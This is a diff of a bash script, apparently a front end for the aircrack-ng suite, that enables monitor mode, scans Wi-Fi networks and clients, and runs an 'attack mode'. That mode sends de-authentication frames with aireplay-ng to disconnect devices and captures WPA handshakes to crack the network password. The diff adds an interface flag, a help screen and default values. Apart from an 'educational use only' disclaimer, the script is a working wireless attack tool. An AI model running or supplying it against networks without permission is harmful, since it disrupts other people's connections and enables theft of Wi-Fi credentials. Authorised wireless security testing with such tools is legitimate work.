@@ -2,52 +2,80 @@
 
 # interfaces
 interface=wlp8s0
-interfaceMon=wlp8s0mon
-# 1 = monitor mode is enabled
-mangedMode=$(sudo airmon-ng | grep $interfaceMon | wc -l)
 # color
 green=`tput setaf 2`
 red=`tput setaf 1`
 reset=`tput sgr0`
 
+# check root permissions
+if [ "$EUID" -ne 0 ]
+ 	then echo "${red}ERROR: Run this script as root!"
+ 	exit
+fi
+
+# help
+showHelp() {
+	echo ""
+	echo "Usage: ./aircrack.sh <options>"
+	echo ""
+	echo "Options:"
+	echo " -i <interface>: Wireless network interface to use. Default is wlp8s0."
+	echo " -h: show help"
+	echo ""
+	exit
+}
+
+while getopts 'hi:' flag; do
+  case "${flag}" in
+  	h) showHelp ;;
+    i) interface="${OPTARG}" ;;
+    *) interface=wlp8s0
+  esac
+done
+
+checkInterface=$(sudo airmon-ng | grep $interface | wc -l)
+
+if [ "$checkInterface" == "0" ]
+	then
+		echo "${red}ERROR: $interface is not a valid network interface!${reset}"
+		showHelp
+	exit	
+fi	
+
+# 1 = monitor mode is enabled
+interfaceMon=$interface"mon"
+mangedMode=$(sudo airmon-ng | grep $interfaceMon | wc -l)
+
 # Welcome text
 figlet "Aircrack"
 echo "DISCLAIMER: For educational use only. Do NOT use on networks you don't own or have permissions to test!"
-echo "- Created by Sondre"
 echo ""
-
-# check root permissions
-if [ "$EUID" -ne 0 ]
- 	then echo "${red}PLEASE RUN THIS SCRIPT AS ROOT!"
- 	exit
-else
- 	echo "${green}Root OK${reset}" 
-fi
 
 # Check if Wi-Fi card is in monitor mode
 if [ "$mangedMode" == "0" ]
 	then
 	echo ""
-	echo "WARNING: Montior mode is not enabled."
-	read -p 'Do you wish to enable monitor mode (y / n)?: ' option1
+	echo "WARNING: Montior mode is not enabled for $interface"
+	read -p 'Enable monitor mode (y/n)? ' option1
 
-	if [ "$option1" == "y" ]
+	if [ "$option1" == "y" ] || [ "$option1" == "Y" ]
 	then
 		echo ""
-		sudo airmon-ng start $interface > /dev/null
-		echo "MONITOR MODE ENABLED"
+		sudo airmon-ng start $interface
+		#interfaceMon=$interface+="mon"
 	fi
 else
-	echo "${green}MONITOR MODE ENABLED: $interfaceMon ${reset}"
+	echo "${green}MONITOR MODE ENABLED: $interfaceMon${reset}"
 fi
 
 # Choose operation
 start () {
 	echo ""
 	echo "-- SELECT AN OPERATION --"
-	echo "[1] Airodump: see traffic"
-	echo "[2] De-auth: De-auth devices on network"
-	echo "[3] Disable monitor mode for $interfaceMon"
+	echo "[1] Scan all networks"
+	echo "[2] Show clients connected to network"
+	echo "[3] Attack mode"
+	echo "[4] Disable monitor mode for $interfaceMon"
 	echo ""
 	read -p 'Select operation: ' option2
 
@@ -57,14 +85,18 @@ start () {
 		echo "Done."
 	elif [ "$option2" == "2" ]
 		then
+		read -p 'Enter network name (SSID): ' name
+		sudo airodump-ng $interfaceMon --essid $name -a 	
+	elif [ "$option2" == "3" ]
+		then
 		echo ""
 		if [ -f "file" ]
 			then
-			read -p "Load saved targets? (y/n) " load
+			read -p "Load saved targets (y/n)? " load
 			echo ""
 		fi
 
-	if [ "$load" == "y" ]
+	if [ "$load" == "y" ] || [ "$load" == "Y" ]
 		then
 		currentLine=1
 		lines=$(wc -l < file)
@@ -93,13 +125,9 @@ start () {
 		channel=$(sed -n $((currentLine+3))p file)
 
 		echo ""
-		echo "-- Selected target --"
-		echo "Name: $name"
-		echo "AP MAC: $ap"
-		echo "Client MAC: $client"
-	  echo "Channel: $channel"
+		echo "${green}$name ($client) is selected! ${reset}"
 	  echo ""
-		read -p "Enter number of requests: " number
+		read -p "De-auth requests (default is 1): " number
 		echo ""
 		read -p "Try to crack WiFi password (y/n)? " capture
 		echo ""
@@ -109,11 +137,11 @@ start () {
 		read -p "Access point MAC address: " ap
 		read -p "Client MAC address (leave empty for every device): " client
 		read -p "Channel: " channel
-		read -p "Number of de-auth request to send: " number
+		read -p "De-auth requests (default is 1): " number
 		read -p "Try to crack WiFi password (y/n)? " capture
 		read -p "Save target for later (y/n)? " save
 
-		if [ "$save" == "y" ]
+		if [ "$save" == "y" ] || [ "$save" == "Y" ]
 			then
 			read -p "Name: " name
 			printf "$name\n$ap\n$client\n$channel\n" >> file # save to file
@@ -121,7 +149,7 @@ start () {
 
 		deAuth
 	fi
-elif [ "$option2" == "3" ]
+elif [ "$option2" == "4" ]
 	then
 	echo "Stoppping interface..."
 	sudo airmon-ng stop $interfaceMon > /dev/null
@@ -132,7 +160,12 @@ fi
 deAuth () {
   sudo airmon-ng start $interfaceMon $channel > /dev/null
 
-  if [ "$capture" == "y" ]
+  if [ "$number" == "" ] # default de-auth requests is 1
+  	then
+  		number=1
+  fi
+
+  if [ "$capture" == "y" ] || [ "$capture" == "Y" ]
   then
   	echo "-- Starting handshake capture --"
   	echo ""
@@ -150,7 +183,7 @@ deAuth () {
 		sudo aireplay-ng -0 $number -a $ap -c $client $interfaceMon
 	fi
 
-	if [ "$capture" == "y" ]
+	if [ "$capture" == "y" ] || [ "$capture" == "Y" ]
   then
   	echo ""
   	echo "-- Stopping handshake capture (10s) ---"
